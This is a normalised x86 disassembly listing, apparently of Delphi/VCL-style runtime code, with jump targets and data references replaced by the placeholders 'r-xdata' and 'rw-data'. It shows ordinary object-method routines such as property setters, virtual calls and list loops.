mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_4520c4
jmp r-xdata
mov eax ebx
call sub_450124
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_453d9c
sub_45211c
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebx + 0x4c ] eax
sub_452144
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_40316c
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4523d8
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403368
mov edx ebx
mov eax edi
call sub_41e7a8
mov eax ebx
mov si 0xffee
call sub_403368
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_4521b4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ esi + 0x4c ] eax
sub_4521e8
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_451cc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_451cd0
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_452228
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_452058
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45203c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45203c
sub_45228c
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_451b50
sub_4522b8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_451b28
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_451b98
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_451bec
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f94
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_451d18
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_451c64
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_451cf4
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_451d08
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4523d8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_451ca8
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403368
sub_4523fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45241c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45243c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45245c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45247c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45249c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4524bc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4524dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4524fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45251c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41858c
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44c36c
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44c4a4
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44c504
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44c204
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44c5c4
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452594
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_451ca8
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_452144
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4525e8
jmp r-xdata
xor edx edx
mov eax esi
call sub_4500ac
sub_4525e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44da80
mov eax ebx
call sub_452658
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44dac4
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41e7a8
sub_452630
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_452630
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44f780
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4520c4
mov eax ebx
pop esi
pop ebx
retn
sub_45266c
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c6a4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044a0
sub_45269c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403fd8
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_452720
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_452842
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404200
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404200
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404460
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40434c
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452849
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4044e8
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042c0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404200
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404460
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4042c0
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_452880
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_452d1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403fd8
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_452ce0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_451cc0
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403fd8
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452d26
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f64
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f64
lea eax [ ebp - 0x18 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
call sub_452ed4
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_451cd0
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40434c
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45269c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_451cd0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451cd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40316c
mov eax [ ebp - 0x20 ]
call sub_40316c
mov eax [ ebp - 0x14 ]
call sub_40316c
mov eax [ ebp - 0xc ]
call sub_40316c
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45269c
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404200
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_451cd0
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_454778
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407ed0
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f94
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6a4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c6a4
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_451cd0
push eax
mov edx esi
mov eax ebx
call sub_451cd0
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404460
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407ed0
push ebp
mov eax [ ebp - 0x2c ]
call sub_45266c
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45266c
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6a4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403fd8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451cd0
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_451cd0
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4546e4
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f94
mov edx esi
mov eax ebx
call sub_451cd0
push eax
mov edx esi
mov eax ebx
call sub_451cd0
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404200
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404460
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_452720
mov eax [ ebp - 0x18 ]
call sub_404200
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044a0
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4044e8
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_452720
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_452d7c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_451cc0
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_451cc0
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_452f00
test al al
je r-xdata
mov eax esi
call sub_451cc0
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_451cd0
call sub_452d58
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_451cd0
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_451cd0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_451cd0
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_451cd0
call sub_452d58
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_451cd0
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_451cd0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_451cd0
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_451cd0
call sub_452d58
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_452ed4
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_452ed4
and eax 0x7f
mov al [ eax + rw-data ]
sub_452f00
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_452f00
and eax 0x7f
mov al [ eax + rw-data ]
sub_452f2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44fc14
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41e6d8
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_453c58
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_452fc8
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_40316c
mov eax [ esi + 0x44 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e724
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_45303c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45303c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44f780
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4520c4
mov eax ebx
pop esi
pop ebx
retn
sub_45307c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_451cc0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_451cd0
call sub_45307c
pop ecx
test al al
je r-xdata
sub_453114
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_45307c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44f780
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_453144
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_453114
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_454468
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_4531b4
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_453114
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_4531d0
push ebx
push esi
push edi
